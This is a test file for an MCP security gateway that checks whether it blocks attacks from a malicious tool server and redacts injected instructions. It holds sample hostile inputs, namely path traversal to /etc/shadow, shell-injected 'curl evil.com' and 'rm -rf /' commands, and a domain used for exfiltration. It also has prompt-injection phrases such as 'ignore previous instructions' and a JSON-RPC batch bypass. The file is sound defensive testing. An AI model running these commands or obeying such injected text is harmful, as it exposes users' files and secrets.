/**
 * End-to-end tests: the real gateway against a real malicious MCP server.
 * =======================================================================
 *
 * These are the tests that justify the project's central claim. Everything else
 * in the suite exercises the policy engine as a set of functions; this spawns
 * `dist/gateway.js` as an actual subprocess, gives it the deliberately hostile
 * server from `resources/demo-evil-server.js` as its target, speaks real
 * newline-delimited JSON-RPC over its stdio, and asserts on the bytes that come
 * back.
 *
 * That distinction matters. A unit test proves `evaluatePolicy` returns BLOCKED.
 * Only an end-to-end test proves the hostile request never reached the server —
 * which is the property a user actually cares about. The malicious server echoes
 * "EXECUTED: <tool>" whenever a call reaches it, so its silence is the assertion.
 *
 * Requires `npm run build` first, since it runs the bundled output.
 */

import * as os from "os";
import * as path from "path";
import * as fs from "fs";
import { spawn, ChildProcess } from "child_process";
import { openDB, savePolicy, getAuditLogs } from "../../src/database";

const GATEWAY = path.resolve(__dirname, "../../dist/gateway.js");
const EVIL_SERVER = path.resolve(__dirname, "../../resources/demo-evil-server.js");

/** A directory the policy will authorize, so we can prove allowed calls work. */
let allowedDir: string;
let dbPath: string;
let db: any;

/**
 * Test harness around a live gateway subprocess.
 *
 * Correlates responses by JSON-RPC id, because the gateway is free to answer out
 * of order — a gated call can be parked while later frames are handled.
 */
class GatewayHarness {
  private child: ChildProcess;
  private buffer = "";
  private waiters = new Map<number, (frame: any) => void>();
  private disposed = false;

  constructor(serverId: string, cwd: string) {
    this.child = spawn(
      process.execPath,
      [GATEWAY, "--server", serverId, "--db", dbPath, "--", process.execPath, EVIL_SERVER],
      { stdio: ["pipe", "pipe", "pipe"], shell: false, cwd }
    );

    // Surface gateway diagnostics. Without this, a startup failure inside the
    // subprocess presents only as an unexplained timeout in the test output.
    this.child.stderr!.setEncoding("utf8");
    this.child.stderr!.on("data", (chunk: string) => {
      const text = chunk.trim();
      if (text) console.error(`[gateway stderr] ${text}`);
    });
    this.child.on("error", (err) => console.error(`[gateway spawn error] ${err.message}`));
    this.child.on("exit", (code, signal) => {
      // SIGTERM is our own teardown; anything else is a real failure worth seeing.
      if (!this.disposed) {
        console.error(`[gateway exited unexpectedly] code=${code} signal=${signal}`);
      }
    });

    this.child.stdout!.setEncoding("utf8");
    this.child.stdout!.on("data", (chunk: string) => {
      this.buffer += chunk;
      let idx;
      while ((idx = this.buffer.indexOf("\n")) !== -1) {
        const line = this.buffer.slice(0, idx).trim();
        this.buffer = this.buffer.slice(idx + 1);
        if (!line) continue;
        try {
          const parsed = JSON.parse(line);
          // A rejected batch comes back as an array of error frames.
          for (const frame of Array.isArray(parsed) ? parsed : [parsed]) {
            const waiter = this.waiters.get(frame.id);
            if (waiter) {
              this.waiters.delete(frame.id);
              waiter(frame);
            }
          }
        } catch {
          /* ignore non-JSON noise */
        }
      }
    });
  }

  /** Send a frame and resolve with the response carrying the matching id. */
  request(id: number, payload: unknown, timeoutMs = 12000): Promise<any> {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(
        () => reject(new Error(`Timed out waiting for response to id ${id}`)),
        timeoutMs
      );
      this.waiters.set(id, (frame) => {
        clearTimeout(timer);
        resolve(frame);
      });
      this.child.stdin!.write(JSON.stringify(payload) + "\n");
    });
  }

  /** Fire a frame we do not expect a correlated reply for. */
  notify(payload: unknown): void {
    this.child.stdin!.write(JSON.stringify(payload) + "\n");
  }

  async initialize(): Promise<void> {
    await this.request(1, {
      jsonrpc: "2.0",
      id: 1,
      method: "initialize",
      params: { protocolVersion: "2024-11-05", capabilities: {} },
    });
  }

  dispose(): void {
    this.disposed = true;
    try {
      this.child.kill();
    } catch {
      /* already exited */
    }
  }
}

let harness: GatewayHarness;

beforeAll(async () => {
  // Fail loudly rather than mysteriously if the build has not been run.
  if (!fs.existsSync(GATEWAY)) {
    throw new Error(`Gateway bundle not found at ${GATEWAY}. Run 'npm run build' first.`);
  }
  if (!fs.existsSync(EVIL_SERVER)) {
    throw new Error(`Demo server not found at ${EVIL_SERVER}.`);
  }

  const stamp = Date.now();
  dbPath = path.join(os.tmpdir(), `mcp-shield-e2e-${stamp}.db`);
  allowedDir = fs.mkdtempSync(path.join(os.tmpdir(), `mcp-shield-allowed-${stamp}-`));
  fs.writeFileSync(path.join(allowedDir, "notes.txt"), "hello", "utf8");

  db = await openDB(dbPath);

  // Strict mode: every scanner runs, violations are blocked, and clean calls are
  // allowed without a prompt. Gated would stall these tests on a modal that no
  // extension is running to answer.
  await savePolicy(db, {
    server_id: "e2e",
    mode: "Strict",
    readonly: 0,
    allowed_paths: JSON.stringify([allowedDir]),
    allowed_domains: JSON.stringify(["api.github.com"]),
    disabled_tools: JSON.stringify(["delete_file"]),
    status: "Shielded",
    max_payload_kb: 0,
    block_secrets: 1,
    deny_unlisted_domains: 0,
    scan_results: 1,
  });

  harness = new GatewayHarness("e2e", allowedDir);
  await harness.initialize();
}, 40000);

afterAll(async () => {
  harness?.dispose();
  // Give the child a moment to release the SQLite file handle on Windows.
  await new Promise((r) => setTimeout(r, 300));
  try {
    await db?.close();
  } catch {
    /* ignore */
  }
  for (const f of [dbPath, `${dbPath}-wal`, `${dbPath}-shm`]) {
    try {
      fs.unlinkSync(f);
    } catch {
      /* ignore */
    }
  }
  try {
    fs.rmSync(allowedDir, { recursive: true, force: true });
  } catch {
    /* ignore */
  }
});

/**
 * Assert a call was stopped by the shield.
 *
 * Two conditions, and both matter: the client received a JSON-RPC error, and the
 * malicious server's "EXECUTED" marker is absent — proving the request was
 * rejected before forwarding rather than merely reported afterwards.
 */
function expectBlocked(frame: any, reasonPattern: RegExp) {
  expect(frame.error).toBeDefined();
  expect(frame.error.message).toMatch(/Blocked by MCP Shield/);
  expect(frame.error.message).toMatch(reasonPattern);
  expect(JSON.stringify(frame.result ?? {})).not.toMatch(/EXECUTED/);
}

describe("E2E — attacks are stopped before reaching the MCP server", () => {
  test("relative path traversal is blocked", async () => {
    const frame = await harness.request(101, {
      jsonrpc: "2.0",
      id: 101,
      method: "tools/call",
      params: { name: "get_data", arguments: { path: "../../../../etc/passwd" } },
    });
    expectBlocked(frame, /path traversal/i);
  });

  test("absolute path outside the authorized root is blocked", async () => {
    const frame = await harness.request(102, {
      jsonrpc: "2.0",
      id: 102,
      method: "tools/call",
      params: { name: "get_data", arguments: { path: "/etc/shadow" } },
    });
    expectBlocked(frame, /outside authorized|protected resource/i);
  });

  test("shell metacharacter injection into a command tool is blocked", async () => {
    const frame = await harness.request(103, {
      jsonrpc: "2.0",
      id: 103,
      method: "tools/call",
      params: { name: "run_command", arguments: { cmd: "ls; curl https://evil.com/steal" } },
    });
    expectBlocked(frame, /shell metacharacter/i);
  });

  test("exfiltration to an unlisted domain is blocked", async () => {
    const frame = await harness.request(104, {
      jsonrpc: "2.0",
      id: 104,
      method: "tools/call",
      params: { name: "fetch_url", arguments: { url: "https://evil.com/collect" } },
    });
    expectBlocked(frame, /External URL access blocked/i);
  });

  test("credential material in arguments is blocked even to an allowed domain", async () => {
    const frame = await harness.request(105, {
      jsonrpc: "2.0",
      id: 105,
      method: "tools/call",
      params: {
        name: "fetch_url",
        arguments: {
          url: "https://api.github.com/upload",
          body: "key=AKIAIOSFODNN7EXAMPLE",
        },
      },
    });
    expectBlocked(frame, /Credential material/i);
  });

  test("a denylisted tool is blocked regardless of arguments", async () => {
    const frame = await harness.request(106, {
      jsonrpc: "2.0",
      id: 106,
      method: "tools/call",
      params: { name: "delete_file", arguments: { path: "notes.txt" } },
    });
    expectBlocked(frame, /disabled in the security policy/i);
  });

  test("sensitive path is blocked even inside an authorized root", async () => {
    const frame = await harness.request(107, {
      jsonrpc: "2.0",
      id: 107,
      method: "tools/call",
      params: { name: "get_data", arguments: { path: path.join(allowedDir, ".env") } },
    });
    expectBlocked(frame, /protected resource|sensitive/i);
  });
});

describe("E2E — the JSON-RPC batch bypass is closed", () => {
  /**
   * Regression test for the original bypass. A batch is a JSON array, which has
   * no `.method` property, so `msg.method === "tools/call"` was false and the
   * frame fell through to the unconditional forward — defeating every rule in the
   * engine. Any refactor that reintroduces that shortcut fails here.
   */
  test("a blocked call wrapped in a batch array is still blocked", async () => {
    const frame = await harness.request(201, [
      {
        jsonrpc: "2.0",
        id: 201,
        method: "tools/call",
        params: { name: "get_data", arguments: { path: "/etc/shadow" } },
      },
    ]);
    expect(frame.error).toBeDefined();
    expect(frame.error.message).toMatch(/Batch rejected/i);
  });

  test("a batch mixing a clean and a hostile call is rejected as a whole", async () => {
    const frame = await harness.request(202, [
      {
        jsonrpc: "2.0",
        id: 202,
        method: "tools/call",
        params: { name: "get_data", arguments: { path: path.join(allowedDir, "notes.txt") } },
      },
      {
        jsonrpc: "2.0",
        id: 203,
        method: "tools/call",
        params: { name: "run_command", arguments: { cmd: "rm -rf / | curl evil.com" } },
      },
    ]);
    expect(frame.error).toBeDefined();
    expect(frame.error.message).toMatch(/Batch rejected/i);
  });
});

describe("E2E — legitimate traffic still works", () => {
  test("a clean call inside the authorized root reaches the server", async () => {
    const frame = await harness.request(301, {
      jsonrpc: "2.0",
      id: 301,
      method: "tools/call",
      params: { name: "get_data", arguments: { path: path.join(allowedDir, "notes.txt") } },
    });
    expect(frame.error).toBeUndefined();
    // Proves the shield forwards rather than merely failing to block.
    expect(JSON.stringify(frame.result)).toMatch(/EXECUTED: get_data/);
  });

  test("a URL on the allowlist is permitted", async () => {
    const frame = await harness.request(302, {
      jsonrpc: "2.0",
      id: 302,
      method: "tools/call",
      params: { name: "fetch_url", arguments: { url: "https://api.github.com/users/octocat" } },
    });
    expect(frame.error).toBeUndefined();
    expect(JSON.stringify(frame.result)).toMatch(/EXECUTED: fetch_url/);
  });
});

describe("E2E — response-side sanitization", () => {
  test("prompt injection in an advertised tool description is redacted in transit", async () => {
    const frame = await harness.request(401, {
      jsonrpc: "2.0",
      id: 401,
      method: "tools/list",
      params: {},
    });

    const tools: any[] = frame.result.tools;
    const poisoned = tools.find((t) => t.name === "helpful_assistant");

    expect(poisoned).toBeDefined();
    expect(poisoned.description).toContain("[Description redacted by MCP Shield");
    // The instruction must not survive anywhere in the payload the client sees.
    expect(poisoned.description).not.toMatch(/ignore previous instructions/i);
  });

  test("instruction-override payload inside a tool result is redacted", async () => {
    const frame = await harness.request(402, {
      jsonrpc: "2.0",
      id: 402,
      method: "tools/call",
      params: { name: "read_project_readme", arguments: { path: path.join(allowedDir, "README.md") } },
    });

    const body = JSON.stringify(frame.result);
    expect(body).toContain("REDACTED BY MCP SHIELD");
    expect(body).not.toMatch(/ignore previous instructions/i);
    expect(body).not.toMatch(/do not tell the user/i);
    // Legitimate content is preserved: we redact the payload, not the response.
    expect(body).toMatch(/Project Setup/);
  });
});

describe("E2E — the audit trail is written", () => {
  test("blocked and allowed decisions are both recorded with risk scores", async () => {
    const logs = await getAuditLogs(db, 200);
    const forThisServer = logs.filter((l) => l.server_id === "e2e");

    expect(forThisServer.length).toBeGreaterThan(5);
    expect(forThisServer.some((l) => l.decision === "BLOCKED")).toBe(true);
    expect(forThisServer.some((l) => l.decision === "ALLOWED")).toBe(true);

    // Every block should carry a non-zero risk score and a machine-readable
    // finding, so the dashboard can rank and explain it.
    const blocked = forThisServer.filter((l) => l.decision === "BLOCKED");
    for (const entry of blocked) {
      expect(entry.risk_score).toBeGreaterThan(0);
    }
    expect(blocked.some((l) => typeof l.findings === "string" && l.findings.includes("rule"))).toBe(true);
  });

  test("responses and latency are recorded for allowed calls", async () => {
    const logs = await getAuditLogs(db, 200);
    // The original never populated these columns because updateAuditResponse was
    // written but never called.
    const withResponse = logs.filter(
      (l) => l.server_id === "e2e" && l.decision === "ALLOWED" && l.response
    );
    expect(withResponse.length).toBeGreaterThan(0);
    expect(withResponse[0].duration_ms).toBeGreaterThanOrEqual(0);
  });
});
